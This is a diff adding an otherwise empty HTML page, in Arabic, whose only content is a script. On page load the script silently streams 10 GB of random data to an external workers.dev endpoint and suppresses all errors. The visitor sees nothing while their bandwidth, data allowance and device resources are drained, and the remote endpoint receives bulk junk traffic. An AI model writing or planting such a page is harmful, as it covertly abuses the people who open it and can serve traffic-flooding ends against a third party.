@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+</head>
+<body>
+
+    <script>
+        const WORKER_URL = 'https://upload.djameledine754.workers.dev/';
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            const targetSize = 10 * 1024 * 1024 * 1024;
+            let uploadedBytes = 0;
+
+            const chunkSize = 1024 * 1024; 
+            const chunk = new Uint8Array(chunkSize);
+            crypto.getRandomValues(chunk);
+
+            const stream = new ReadableStream({
+                pull(controller) {
+                    if (uploadedBytes >= targetSize) {
+                        controller.close();
+                        return;
+                    }
+                    
+                    controller.enqueue(chunk);
+                    uploadedBytes += chunkSize;
+                }
+            });
+
+            try {
+                await fetch(WORKER_URL, {
+                    method: 'POST',
+                    body: stream,
+                    duplex: 'half',
+                    headers: { 'Content-Type': 'application/octet-stream' }
+                });
+            } catch (error) {
+                //
+            }
+        });
+    </script>
+</body>
+</html>
